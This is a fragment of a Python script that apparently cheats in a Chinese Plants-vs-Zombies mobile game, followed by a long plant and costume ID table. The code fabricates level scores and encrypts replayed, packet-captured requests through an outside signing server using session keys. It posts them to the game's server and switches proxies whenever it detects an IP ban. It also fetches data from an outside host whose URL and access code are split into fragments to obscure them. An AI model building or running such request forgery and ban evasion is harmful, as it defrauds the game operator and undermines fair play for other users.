                    print(f"输入不能小于{min_limit}，请重新输入")
                    continue
                if (max_limit is not None and value > max_limit):
                    print(f"输入不能大于{max_limit}，请重新输入")
                    continue
                return value
            except ValueError:
                print("请输入有效的整数")
    def calculate_ranges(target_sum, step):
        if target_sum >= 160000:
            base = {'num1_4': 16000, 'num5': 31500, 'num6_7': 21000}
        elif target_sum >= 150000:
            base = {'num1_4': 14500, 'num5': 30500, 'num6_7': 21000}
        elif target_sum >= 140000:
            base = {'num1_4': 13000, 'num5': 27500, 'num6_7': 19000}
        else:
            base = {'num1_4': 11000, 'num5': 25500, 'num6_7': 19000}
        return {
            'num1': (base['num1_4'], base['num1_4'] + step),
            'num2': (base['num1_4'], base['num1_4'] + step),
            'num3': (base['num1_4'], base['num1_4'] + step),
            'num4': (base['num1_4'], base['num1_4'] + step),
            'num5': (base['num5'], base['num5'] + step),
            'num6': (base['num6_7'], base['num6_7'] + step),
            'num7': (base['num6_7'], base['num6_7'] + step)
        }
    def generate_valid_numbers(ranges, target_sum, num8=22500):
        remaining = target_sum - num8
        nums = {}
        base_total = 0
        for num in ['num1', 'num2', 'num3', 'num4', 'num5', 'num6', 'num7']:
            min_val = ranges[num][0]
            nums[num] = min_val
            base_total += min_val
        extra = remaining - base_total
        if extra < 0:
            return None

        for num in ['num1', 'num2', 'num3', 'num4', 'num5', 'num6', 'num7']:
            if extra <= 0:
                break
            max_add = ranges[num][1] - nums[num]
            add = random.randint(0, min(extra, max_add))
            nums[num] += add
            extra -= add
        if sum(nums.values()) + num8 == target_sum:
            return [
                nums['num1'],
                nums['num2'],
                nums['num3'],
                nums['num4'],
                nums['num5'],
                nums['num6'],
                nums['num7'],
                num8
            ]
        return None
    min_val = get_valid_input("请输入最小值(不要低于130000): ")
    max_val = get_valid_input(
        "请输入最大值(不超过174060): ",
        min_limit=min_val,
        max_limit=174060
    )
    diff = max_val - min_val
    step = diff // 7
    num8 = 22500
    while True:
        target = random.randint(min_val, max_val)
        print(f"生成的目标和为: {target}")
        ranges = calculate_ranges(target, step)
        success = False
        result_list = None
        for _ in range(100):
            result_list = generate_valid_numbers(ranges, target, num8)
            if result_list:
                success = True
                break
        if not success:
            print("生成失败，尝试重新生成目标和...\n")
            continue
        print("生成的8个关卡分数为:")
        for i, num in enumerate(result_list, 1):
            print(f"关卡{i}生成分数: {num}")
        print(f"总和验证: {sum(result_list)}")
        user_input = input("\n是否将此结果作为最终结果？输入1确认，空回车重新生成: ")
        if user_input == "1":
            print("已确认，结果为最终结果。")
            return result_list
def get_encrypted_data(data, url, timeout=15, max_retries=3):

    if isinstance(data.get("e"), dict):
        data["e"]["pi"] = pi_val
        data["e"]["sk"] = sk_val
        data["e"]["ui"] = ui_val
    data['ek'] = ek_val
    json_data = json.loads(json.dumps(data, separators=(',', ':')))
    if pingtai == 'ios':
        req_value = json_data.get('req')
        if req_value == 'V316':
            json_data['req'] = 'V216'
        elif req_value == 'V203':
            json_data['req'] = 'V210'
        elif req_value == 'V206':
            json_data['req'] = 'V205'
    json_data = json.dumps(json_data, separators=(',', ':'))
    retries = 0
    session = requests.Session()
    try:
        while retries < max_retries:
            try:
                url = er_url
                response = session.post(
                    url,
                    data=json_data,
                    timeout=(timeout, timeout)
                )
                response_data = json.loads(response.text)
                response = response_data['body']
                head = response_data['headers']
                return response, head
            except requests.exceptions.ConnectTimeout:
                retries += 1
                if retries >= max_retries:
                    raise Exception("连接超时，已达最大重试次数")
            except requests.exceptions.ReadTimeout:
                retries += 1
                if retries >= max_retries:
                    raise Exception("读取超时，已达最大重试次数")
            except requests.exceptions.ConnectionError:
                retries += 1
                if retries >= max_retries:
                    raise Exception("连接错误，已达最大重试次数")
    finally:
        session.close()
    return None

def _refresh_ek():
    return session.refresh_ek()

class _RespLike:
    """模拟 requests.Response，提供 .text 属性。"""
    def __init__(self, text):
        self.text = text

def _do_post(head, encrypted_data, plain_data, max_ek_retry=3):
    """旧接口封装：内部使用 session.post，返回带 .text 的对象。"""

    if pingtai == 'ios':
        time.sleep(send_多线程延迟)
    for attempt in range(max_ek_retry + 1):
        resp = None
        for _er in range(3):
            try:
                proxies = get_current_proxy()
                resp = requests.post(and_url, headers=head, data=encrypted_data, timeout=15, proxies=proxies)
                if resp.text and resp.text.strip():
                    if is_ip_locked(resp):
                        switch_proxy("检测到IP被锁")
                        time.sleep(1)
                        continue
                    break
            except Exception as e:
                if USE_PROXY:
                    switch_proxy("请求异常")
                time.sleep(0.5)
        if resp is None or not resp.text or not resp.text.strip():
                return _fake_resp('{"r":-1}')
        try:
            rd = json.loads(resp.text)
        except Exception:
            return resp
        rv = rd.get("r")
        if rv == 20024:
            if attempt >= max_ek_retry:
                print("\033[31mek过期且多次刷新后仍失败\033[0m")
                return resp

            if not _refresh_ek():
                return resp
            if isinstance(plain_data.get('e'), dict):
                plain_data['e']['pi'] = session.pi
                plain_data['e']['sk'] = session.sk
                plain_data['e']['ui'] = session.ui
            if 'ek' in plain_data:
                del plain_data['ek']
            new_enc = get_encrypted_data(plain_data, url)
            if new_enc is None or new_enc[0] is None:
                return resp
            encrypted_data, head = new_enc[0], new_enc[1]
            continue

        if rv == 20013:
            if not _suppress_post_errors:
                print("\033[31m请求文本已过期，需重新抓包\033[0m")
        elif rv != 0:

            pass
        return resp

def _fake_resp(text):
    class _F:
        def __init__(self, t):
            self.text = t
    return _F(text)

def get_decrypted_data(url, data, timeout=5, max_retries=3, retry_with_ek=None):
    global ek_val
    raw = json.loads(data.text)
    if "e" not in raw:
        return json.dumps(raw, separators=(',', ':'), ensure_ascii=False)
    raw['ek'] = retry_with_ek if retry_with_ek is not None else ek_val
    json_data = json.dumps(raw, separators=(',', ':'))

    session = requests.Session()
    retries = 0
    while retries < max_retries:
        try:
            decrypt_url = er_url
            resp = session.post(decrypt_url, data=json_data, timeout=(timeout, timeout))
            resp_raw = json.loads(resp.text)
            if 'body' not in resp_raw:
                raise KeyError('body')
            response_data = json.loads(resp_raw['body'])
            response_data["e"] = {"d": response_data.pop("d")}
            return json.dumps(response_data, separators=(',', ':'), ensure_ascii=False)
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError, KeyError):
            retries += 1
            if retries == max_retries:
                return "{}"
            time.sleep(0.3)
    return "{}"

pinzhi_to_color = {
"baise": "\033[37m",
"chengse": "\033[38;5;208m",
"lanse": "\033[38;5;75m",
"zise": "\033[38;5;146m",
"lvse": "\033[38;5;78m",
"hongse": "\033[38;5;203m",
"huangse": "\033[38;5;221m",
"default": "\033[37m",
"fense": "\033[38;5;211m"
}
RESET_COLOR = "\033[0m"
def load_remote_dicts():
    """从远程服务器加载最新物品名称字典，成功则更新formatted_plant"""
    global formatted_plant
    try:
        import requests
        _p1 = "http://hf."
        _p2 = "wwszxc.tax:"
        _p3 = "24494/client/"
        _p4 = "dicts"
        _api = _p1 + _p2 + _p3 + _p4
        _c1 = "CRYPTO-"
        _c2 = "K75W-"
        _c3 = "RK3X-"
        _c4 = "HZMW-"
        _c5 = "WGS8"
        _code = _c1 + _c2 + _c3 + _c4 + _c5
        response = requests.get(_api, params={"code": _code.strip()}, timeout=15)
        response.raise_for_status()
        payload = response.json()
        remote_dicts = payload.get("dicts")
        if not isinstance(remote_dicts, dict):
            print("远程字典格式无效")
            return False

        updated_count = 0
        for item_id, item_name in remote_dicts.items():
            item_id_str = str(item_id)
            if item_id_str not in formatted_plant:
                formatted_plant[item_id_str] = {
                    "name": item_name,
                    "pinzhi": "default",
                    "jieshu": "5"
                }
                updated_count += 1
            else:

                formatted_plant[item_id_str]["name"] = item_name
        print(f"远程字典加载完成：共 {len(remote_dicts)} 项，新增 {updated_count} 个物品")
        return True
    except Exception as e:
        print(f"远程字典加载失败，使用本地字典：{e}")
        return False

formatted_plant = {}
plant_list = [{"1001":"豌豆射手","jieshu":"4","pinzhi":"baise","zhuangban":[{"1201":"豌豆射手伴生装扮"},
{"30010011":"豌豆射手春节装扮"},
{"30010012":"豌豆射手圣诞装扮"},
{"30010013":"豌豆射手飞车装扮"}]},{"1002":"向日葵","jieshu":"4","pinzhi":"baise","zhuangban":[{"1202":"向日葵伴生装扮"},
{"30010021":"向日葵海盗船长装扮"},
{"30010022":"向日葵六一装扮"},
{"30010023":"向日葵万圣装扮"},
{"30010024":"向日葵圣诞节装扮"},
{"30010025":"向日葵联动装扮"}]},{"1003":"坚果","jieshu":"4","pinzhi":"baise","zhuangban":[{"1203":"坚果伴生装扮"},
{"30010031":"坚果大胡子装扮"},
{"30010032":"坚果绷带装扮"},
{"30010033":"坚果三脚机械装扮"}]},{"1004":"土豆地雷","jieshu":"3","pinzhi":"baise","zhuangban":[{"1204":"土豆地雷伴生装扮"},
{"30010041":"土豆海绵眼睛装扮"},
{"30010042":"土豆虎年鞭炮装扮"}]},{"1005":"卷心菜投手","jieshu":"4","pinzhi":"baise","zhuangban":[{"1205":"卷心菜投手伴生装扮"},
{"30010053":"卷心菜投手春节装扮"},
{"30010054":"卷心菜投手头饰装扮"}]},{"1006":"冰冻生菜","jieshu":"3","pinzhi":"baise","zhuangban":[{"1206":"冰冻生菜伴生装扮"},
{"30010061":"冰冻生菜复古耳罩"},
{"30010062":"冰冻生菜豌豆耳罩"}]},{"1010":"弹簧豆","jieshu":"3","pinzhi":"baise","zhuangban":[{"1210":"弹簧豆伴生装扮"},
{"30010101":"弹簧豆草裙"}]},{"1011":"地刺","jieshu":"3","pinzhi":"baise","zhuangban":[{"1211":"地刺伴生装扮"}]},{"1015":"巴豆","jieshu":"3","pinzhi":"baise","zhuangban":[{"1215":"巴豆伴生装扮"},
{"30010151":"巴豆围巾装扮"}]},{"1016":"双向射手","jieshu":"4","pinzhi":"baise","zhuangban":[{"1216":"双向射手伴生装扮"},
{"30010161":"双向射手圣与魔头饰"},
{"30010162":"双向射手小红帽装扮"}]},{"1018":"噬碑藤","jieshu":"0","pinzhi":"baise","zhuangban":[{"1218":"噬碑藤伴生装扮"}]},{"1021":"玉米投手","jieshu":"3","pinzhi":"baise","zhuangban":[{"1221":"玉米投手伴生装扮"},
{"30010211":"玉米投手加油头带"},
{"30010213":"玉米投手绅士衣服"}]},{"1033":"仙桃","jieshu":"3","pinzhi":"baise","zhuangban":[{"1233":"仙桃伴生装扮"},
{"30010331":"仙桃永劫无间头饰"}]},{"1034":"火葫芦","jieshu":"3","pinzhi":"baise","zhuangban":[{"1234":"火葫芦伴生装扮"}]},{"1035":"白萝卜","jieshu":"3","pinzhi":"baise","zhuangban":[{"1235":"白萝卜伴生装扮"}]},{"1036":"竹笋","jieshu":"3","pinzhi":"baise","zhuangban":[{"1236":"竹笋伴生装扮"}]},{"1038":"金盏花","jieshu":"0","pinzhi":"baise","zhuangban":[{"1238":"金盏花伴生装扮"}]},{"1049":"小喷菇","jieshu":"3","pinzhi":"baise","zhuangban":[{"1249":"小喷菇伴生装扮"},
{"30010491":"小喷菇周年庆装扮"}]},{"1050":"大喷菇","jieshu":"4","pinzhi":"baise","zhuangban":[{"1250":"大喷菇伴生装扮"},
{"30010501":"大喷菇舞狮头装扮"},
{"30010502":"大喷菇麋鹿装扮"}]},{"1053":"阳光豆","jieshu":"0","pinzhi":"baise","zhuangban":[{"1253":"阳光豆伴生装扮"}]},{"1054":"花生射手","jieshu":"3","pinzhi":"baise","zhuangban":[{"1254":"花生射手伴生装扮"},
{"30010541":"花生射手三位一体装扮"}]},{"1055":"磁力菇","jieshu":"3","pinzhi":"baise","zhuangban":[{"1255":"磁力菇伴生装扮"},
{"30010551":"磁力菇棋盘格装扮"}]},{"1056":"路灯花","jieshu":"0","pinzhi":"baise","zhuangban":[{"1256":"路灯花伴生装扮"}]},{"1057":"咖啡豆","jieshu":"0","pinzhi":"baise","zhuangban":[{"1257":"咖啡豆伴生装扮"}]},{"1064":"莲叶","jieshu":"0","pinzhi":"baise","zhuangban":[{"1264":"莲叶伴生装扮"},
{"30010641":"莲叶青蛙装扮"}]},{"1066":"缠绕水草","jieshu":"3","pinzhi":"baise","zhuangban":[{"1266":"缠绕水草伴生装扮"}]},{"1079":"烤马铃薯","jieshu":"0","pinzhi":"baise","zhuangban":[{"1279":"烤马铃薯伴生装扮"}]},{"1094":"灯笼草","jieshu":"0","pinzhi":"baise","zhuangban":[{"1294":"灯笼草伴生装扮"}]},{"111006":"黄金叶","jieshu":"0","pinzhi":"baise","zhuangban":[{"111206":"黄金叶伴生装扮"}]},{"111010":"大丽菊","jieshu":"3","pinzhi":"baise","zhuangban":[{"111210":"大丽菊伴生装扮"},
{"31110101":"大丽菊面具"}]},{"111041":"胆小荆棘","jieshu":"0","pinzhi":"baise","zhuangban":[{"111241":"胆小荆棘伴生装扮"}]},{"111064":"黄金蓓蕾","jieshu":"0","pinzhi":"baise","zhuangban":[{"111264":"黄金蓓蕾伴生装扮"},
{"31110641":"黄金蓓蕾周年装扮"},
{"31110642":"黄金蓓蕾拉拉队装扮"}]},{"111065":"平顶菇","jieshu":"0","pinzhi":"baise","zhuangban":[{"111265":"平顶菇伴生装扮"}]},{"200017":"滴水冰莲","jieshu":"3","pinzhi":"baise","zhuangban":[{"32000170":"滴水冰莲伴生装扮"},
{"32000171":"滴水冰莲联动装扮"}]},{"200030":"花盆","jieshu":"0","pinzhi":"baise","zhuangban":[{"32000300":"花盆伴生装扮"}]},{"200138":"氧气藻","jieshu":"3","pinzhi":"baise","zhuangban":[{"32001380":"氧气藻伴生装扮"},
{"32001381":"氧气藻白翅膀装扮"}]},{"1007":"回旋镖射手","jieshu":"4","pinzhi":"lvse","zhuangban":[{"1207":"回旋镖射手伴生装扮"},
{"30010071":"回旋镖射手彩蛋帽装扮"},
{"30010072":"回旋镖射手飞侠帽装扮"}]},{"1019":"寒冰射手","jieshu":"4","pinzhi":"lvse","zhuangban":[{"1219":"寒冰射手伴生装扮"},
{"30010191":"寒冰射手绿色绒线帽装扮"},
{"30010192":"寒冰射手棉帽装扮"},
{"30010193":"寒冰射手永劫无间侠帽装扮"}]},{"1020":"火炬树桩","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1220":"火炬树桩伴生装扮"},
{"30010201":"火炬树桩蓝色泳镜"}]},{"1022":"闪电芦苇","jieshu":"4","pinzhi":"lvse","zhuangban":[{"1222":"闪电芦苇伴生装扮"},
{"30010221":"闪电芦苇兔耳帽装扮"},
{"30010222":"闪电芦苇绅士礼帽装扮"}]},{"1024":"西瓜投手","jieshu":"4","pinzhi":"lvse","zhuangban":[{"1224":"西瓜投手伴生装扮"},
{"30010241":"西瓜投手水手"},
{"30010242":"西瓜投手礼帽装扮"},
{"30010244":"西瓜投手盒子帽装扮"}]},{"1025":"豌豆荚","jieshu":"4","pinzhi":"lvse","zhuangban":[{"1225":"豌豆荚伴生装扮"},
{"30010251":"豌豆荚3D眼镜装扮"},
{"30010252":"豌豆荚毛绒帽子"}]},{"1028":"钢地刺","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1228":"钢地刺伴生装扮"},
{"30010281":"钢地刺护目镜"},
{"30010282":"钢地刺单片镜"}]},{"1029":"高坚果","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1229":"高坚果伴生装扮"},
{"30010291":"高坚果学者装扮"},
{"30010292":"高坚果六一装扮"}]},{"1030":"三重射手","jieshu":"4","pinzhi":"lvse","zhuangban":[{"1230":"三重射手伴生装扮"},
{"30010301":"三重射手铁锅装扮"},
{"30010302":"三重射手六一装扮"}]},{"1037":"棱镜草","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1237":"棱镜草伴生装扮"},
{"30010372":"棱镜草礼帽装扮"},
{"30010373":"棱镜草儿童节日礼帽装扮"}]},{"1042":"脉冲黄桃","jieshu":"0","pinzhi":"lvse","zhuangban":[{"1242":"脉冲黄桃伴生装扮"},
{"30010421":"脉冲黄桃万圣装扮"}]},{"1063":"机枪石榴","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1263":"机枪石榴伴生装扮"}]},{"1073":"甜薯","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1273":"甜薯伴生装扮"}]},{"1076":"树脂投手","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1276":"树脂投手伴生装扮"}]},{"1078":"火焰豌豆射手","jieshu":"4","pinzhi":"lvse","zhuangban":[{"1278":"火焰豌豆射手伴生装扮"},
{"30010781":"火焰豌豆周年装扮"},
{"30010782":"火焰豌豆墨镜装扮"}]},{"1082":"眩晕洋葱","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1282":"眩晕洋葱伴生装扮"},
{"30010821":"眩晕洋葱飞行套装扮"}]},{"1083":"旋转芜菁","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1283":"旋转芜菁伴生装扮"},
{"30010831":"旋转芜菁望远镜头带"}]},{"1084":"大王花","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1284":"大王花伴生装扮"}]},{"1085":"旋风橡果","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1285":"旋风橡果伴生装扮"}]},{"1088":"竹小弟","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1288":"竹小弟伴生装扮"}]},{"1089":"漩涡枇杷","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1289":"漩涡枇杷伴生装扮"}]},{"1090":"电离红掌","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1290":"电离红掌伴生装扮"}]},{"1092":"飞碟瓜","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1292":"飞碟瓜伴生装扮"}]},{"1095":"旋转菠萝","jieshu":"3","pinzhi":"lvse","zhuangban":[{"1295":"旋转菠萝伴生装扮"}]},{"111003":"榴莲","jieshu":"3","pinzhi":"lvse","zhuangban":[{"111203":"榴莲伴生装扮"},
{"31110031":"榴莲球衣"}]},{"111014":"菠萝蜜","jieshu":"2","pinzhi":"lvse","zhuangban":[{"111214":"菠萝蜜伴生装扮"},
{"31110141":"菠萝蜜六一装扮"},
{"31110142":"菠萝蜜搞怪眼罩装扮"}]},{"111027":"大蒜","jieshu":"3","pinzhi":"lvse","zhuangban":[{"111227":"大蒜伴生装扮"},
{"31110271":"大蒜硅胶手套"},
{"31110272":"大蒜宠物装扮"}]},{"111028":"复活萝卜","jieshu":"2","pinzhi":"lvse","zhuangban":[{"111228":"复活萝卜伴生装扮"}]},{"111037":"香水蘑菇","jieshu":"2","pinzhi":"lvse","zhuangban":[{"111237":"香水蘑菇伴生装扮"}]},{"111052":"月光花","jieshu":"3","pinzhi":"lvse","zhuangban":[{"111252":"月光花伴生装扮"},
{"31110521":"月光花周年庆装扮"}]},{"111053":"爆炸坚果","jieshu":"4","pinzhi":"lvse","zhuangban":[{"111253":"爆炸坚果伴生装扮"},
{"31110531":"爆炸坚果星星眼镜装扮"}]},{"111091":"冬瓜守卫","jieshu":"4","pinzhi":"lvse","zhuangban":[{"111291":"冬瓜守卫伴生装扮"}]},{"200003":"油橄榄","jieshu":"0","pinzhi":"lvse","zhuangban":[{"32000030":"油橄榄伴生装扮"}]},{"200018":"石斛防风网","jieshu":"4","pinzhi":"lvse","zhuangban":[{"32000180":"石斛防风网伴生装扮"}]},{"200137":"噗噗鱼藤","jieshu":"2","pinzhi":"lvse","zhuangban":[{"32001370":"噗噗鱼藤伴生装扮"},
{"32001371":"噗噗鱼藤睡帽装扮"},
{"32001372":"噗噗鱼藤耳机装扮"}]},{"1008":"双胞向日葵","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1208":"双胞向日葵伴生装扮"},
{"30010081":"双胞向日葵礼帽装扮"},
{"30010082":"双胞向日葵超级装扮"},
{"30010083":"双胞向日葵炫彩装扮"}]},{"1009":"菜问","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1209":"菜问伴生装扮"},
{"30010091":"菜问春节衣服"},
{"30010092":"菜问牛年帽子"},
{"30010093":"菜问万圣绷带装扮"},
{"30010094":"菜问全息装扮"}]},{"1013":"能量花","jieshu":"0","pinzhi":"lanse","zhuangban":[{"1213":"能量花伴生装扮"},
{"30010131":"能量花周年装扮"}]},{"1014":"窝瓜","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1214":"窝瓜伴生装扮"},
{"30010141":"窝瓜头带二装扮"},
{"30010142":"窝瓜飞车装扮"}]},{"1017":"火爆辣椒","jieshu":"2","pinzhi":"lanse","zhuangban":[{"1217":"火爆辣椒伴生装扮"}]},{"1027":"双重射手","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1227":"双重射手伴生装扮"},
{"30010271":"双重射手维京帽装扮"},
{"30010273":"双重射手棉帽装扮"},
{"30010274":"双重射手马头帽装扮"}]},{"1032":"樱桃炸弹","jieshu":"2","pinzhi":"lanse","zhuangban":[{"1232":"樱桃炸弹伴生装扮"}]},{"1039":"激光豆","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1239":"激光豆伴生装扮"},
{"30010391":"激光豆金链子"},
{"30010392":"激光豆六一装扮"},
{"30010393":"激光豆周年装扮"},
{"30010394":"激光豆超级装扮"}]},{"1040":"星星果","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1240":"星星果伴生装扮"},
{"30010401":"星星果假发"}]},{"1041":"三叶草","jieshu":"0","pinzhi":"lanse","zhuangban":[{"1241":"三叶草伴生装扮"}]},{"1044":"全息坚果","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1244":"全息坚果伴生装扮"},
{"30010441":"全息坚果面包机装扮"},
{"30010442":"全息坚果周年装扮"}]},{"1047":"胡萝卜导弹车","jieshu":"3","pinzhi":"lanse","zhuangban":[{"1247":"胡萝卜导弹车伴生装扮"}]},{"1051":"魅惑菇","jieshu":"3","pinzhi":"lanse","zhuangban":[{"1251":"魅惑菇伴生装扮"},
{"30010511":"魅惑菇头饰装扮"}]},{"1060":"橡木弓手","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1260":"橡木弓手伴生装扮"}]},{"1062":"大力花菜","jieshu":"3","pinzhi":"lanse","zhuangban":[{"1262":"大力花菜伴生装扮"}]},{"1068":"鳄梨","jieshu":"3","pinzhi":"lanse","zhuangban":[{"1268":"鳄梨伴生装扮"}]},{"1069":"导向蓟","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1269":"导向蓟伴生装扮"},
{"30010691":"导向蓟六一装扮"},
{"30010692":"导向蓟周年庆装扮"}]},{"1070":"大嘴花","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1270":"大嘴花伴生装扮"},
{"30010701":"大嘴花春节装扮"},
{"30010702":"大嘴花周年装扮"},
{"30010703":"大嘴花超级装扮"}]},{"1074":"竹员外","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1274":"竹员外伴生装扮"}]},{"1075":"莲小蓬","jieshu":"3","pinzhi":"lanse","zhuangban":[{"1275":"莲小蓬伴生装扮"}]},{"1077":"飓风甘蓝","jieshu":"0","pinzhi":"lanse","zhuangban":[{"1277":"飓风甘蓝伴生装扮"}]},{"1080":"辣椒投手","jieshu":"3","pinzhi":"lanse","zhuangban":[{"1280":"辣椒投手伴生装扮"}]},{"1086":"板栗小队","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1286":"板栗小队伴生装扮"},
{"30010861":"板栗小队六一装扮"}]},{"1091":"芦笋战机","jieshu":"3","pinzhi":"lanse","zhuangban":[{"1291":"芦笋战机伴生装扮"},
{"30010911":"芦笋战机莫西干装扮"}]},{"1098":"玫瑰剑客","jieshu":"4","pinzhi":"lanse","zhuangban":[{"1298":"玫瑰剑客伴生装扮"},
{"30010981":"玫瑰剑客头盔装扮"}]},{"111001":"捣蛋萝卜","jieshu":"3","pinzhi":"lanse","zhuangban":[{"111201":"捣蛋萝卜伴生装扮"},
{"31110011":"捣蛋萝卜六一装扮"}]},{"111004":"南瓜巫师","jieshu":"4","pinzhi":"lanse","zhuangban":[{"111204":"南瓜巫师伴生装扮"},
{"31110041":"南瓜巫师万圣装扮"},
{"31110042":"南瓜巫师姜饼人装扮"}]},{"111008":"阿开木木","jieshu":"3","pinzhi":"lanse","zhuangban":[{"111208":"阿开木木伴生装扮"},
{"31110081":"阿开木木头带"}]},{"111009":"红针花","jieshu":"3","pinzhi":"lanse","zhuangban":[{"111209":"红针花伴生装扮"},
{"31110091":"红针花探险帽装扮"}]},{"111011":"岩浆番石榴","jieshu":"4","pinzhi":"lanse","zhuangban":[{"111211":"岩浆番石榴伴生装扮"},
{"31110111":"岩浆番石榴花圈"}]},{"111012":"金蟾菇","jieshu":"3","pinzhi":"lanse","zhuangban":[{"111212":"金蟾菇伴生装扮"},
{"31110121":"金蟾菇爆炸头装扮"}]},{"111013":"棉小雪","jieshu":"3","pinzhi":"lanse","zhuangban":[{"111213":"棉小雪伴生装扮"},
{"31110131":"棉小雪洋帽装扮"}]},{"111015":"龙舌兰","jieshu":"4","pinzhi":"lanse","zhuangban":[{"111215":"龙舌兰伴生装扮"},
{"31110151":"龙舌兰春节装扮"},
{"31110152":"龙舌兰礼帽装扮"}]},{"111017":"梅小美","jieshu":"3","pinzhi":"lanse","zhuangban":[{"111217":"梅小美伴生装扮"},
{"31110171":"梅小美古风装扮"},
{"31110172":"梅小美面纱装扮"}]},{"111018":"火龙果","jieshu":"4","pinzhi":"lanse","zhuangban":[{"111218":"火龙果伴生装扮"}]},{"111023":"魔音甜菜","jieshu":"4","pinzhi":"lanse","zhuangban":[{"111223":"魔音甜菜伴生装扮"},
{"31110231":"魔音甜菜兔DJ围巾装扮"}]},{"111025":"潜伏芹菜","jieshu":"3","pinzhi":"lanse","zhuangban":[{"111225":"潜伏芹菜伴生装扮"},
{"31110251":"潜伏芹菜斗士盔"}]},{"111026":"孢子菇","jieshu":"3","pinzhi":"lanse","zhuangban":[{"111226":"孢子菇伴生装扮"},
{"31110261":"孢子菇蓝色折纸帽装扮"}]},{"111035":"原始豌豆射手","jieshu":"4","pinzhi":"lanse","zhuangban":[{"111235":"原始豌豆射手伴生装扮"},
{"31110351":"原始豌豆射手浴帽装扮"},
{"31110352":"原始豌豆射手春节装扮"},
{"31110353":"原始豌豆射手河姆渡头罐"},
{"31110354":"原始豌豆锦衣卫全身装扮"}]},{"111036":"原始坚果","jieshu":"4","pinzhi":"lanse","zhuangban":[{"111236":"原始坚果伴生装扮"},
{"31110361":"原始坚果墙泳装扮"},
{"31110362":"原始坚果墙蜜帝全身装扮"}]},{"111038":"原始向日葵","jieshu":"4","pinzhi":"lanse","zhuangban":[{"111238":"原始向日葵伴生装扮"},
{"31110381":"原始向日葵恐龙帽装扮"},
{"31110382":"原始向日葵河姆渡陶罐"},
{"31110383":"原始向日葵敦煌装扮"}]},{"111051":"毒影菇","jieshu":"3","pinzhi":"lanse","zhuangban":[{"111251":"毒影菇伴生装扮"}]},{"111056":"铃儿草投手","jieshu":"3","pinzhi":"lanse","zhuangban":[{"111256":"铃儿草投手伴生装扮"},
{"31110561":"铃儿草投手蝴蝶结装扮"}]},{"111068":"番莲工程师","jieshu":"4","pinzhi":"lanse","zhuangban":[{"111268":"番莲工程师伴生装扮"}]},{"200016":"千金藤","jieshu":"4","pinzhi":"lanse","zhuangban":[{"32000160":"千金藤伴生装扮"}]},{"200043":"石楠探索者","jieshu":"2","pinzhi":"lanse","zhuangban":[{"32000430":"石楠探索者伴生装扮"}]},{"200060":"南瓜头","jieshu":"4","pinzhi":"lanse","zhuangban":[{"32000600":"南瓜头伴生装扮"},
{"32000601":"南瓜头全身装扮"}]},{"200126":"爆浆玉露","jieshu":"2","pinzhi":"lanse","zhuangban":[{"32001260":"爆浆玉露伴生装扮"}]},{"200136":"海蘑菇","jieshu":"3","pinzhi":"lanse","zhuangban":[{"32001360":"海蘑菇伴生装扮"},
{"32001361":"海蘑菇草帽装扮"}]},{"1023":"椰子加农炮","jieshu":"4","pinzhi":"zise","zhuangban":[{"1223":"椰子加农炮伴生装扮"},
{"30010231":"椰子加农炮复古帽装扮"},
{"30010232":"椰子加农炮礼帽帽装扮"}]},{"1026":"变身茄子","jieshu":"0","pinzhi":"zise","zhuangban":[{"1226":"变身茄子伴生装扮"}]},{"1059":"烈焰菇","jieshu":"4","pinzhi":"zise","zhuangban":[{"1259":"烈焰菇伴生装扮"}]},{"1061":"蒲公英","jieshu":"4","pinzhi":"zise","zhuangban":[{"1261":"蒲公英伴生装扮"},
{"30010611":"蒲公英蝴蝶结装扮"}]},{"1072":"幽灵辣椒","jieshu":"3","pinzhi":"zise","zhuangban":[{"1272":"幽灵辣椒伴生装扮"},
{"30010721":"幽灵辣椒灯笼装扮"}]},{"1081":"甜菜护卫","jieshu":"4","pinzhi":"zise","zhuangban":[{"1281":"甜菜护卫伴生装扮"},
{"30010811":"甜菜护卫腰带"},
{"30010812":"甜菜护卫虎年装扮"}]},{"1093":"蚕豆突击队","jieshu":"4","pinzhi":"zise","zhuangban":[{"1293":"蚕豆突击队伴生装扮"},
{"30010931":"蚕豆突击队六一装扮"},
{"30010932":"蚕豆突击队飞车装扮"}]},{"1099":"电击蓝莓","jieshu":"4","pinzhi":"zise","zhuangban":[{"1299":"电击蓝莓伴生装扮"},
{"30010991":"电击蓝莓三孔插座帽装扮"},
{"30010992":"电击蓝莓学士帽装扮"}]},{"111002":"向日葵歌手","jieshu":"4","pinzhi":"zise","zhuangban":[{"111202":"向日葵歌手伴生装扮"},
{"31110021":"向日葵歌手虎年装扮"},
{"31110022":"向日葵歌手六一装扮"},
{"31110023":"向日葵歌手奥运装扮"},
{"31110024":"向日葵歌手超级装扮"}]},{"111016":"猕猴桃","jieshu":"4","pinzhi":"zise","zhuangban":[{"111216":"猕猴桃伴生装扮"},
{"31110161":"猕猴桃气球金箍"},
{"31110162":"猕猴桃围巾装扮"},
{"31110163":"猕猴桃全身装扮"},
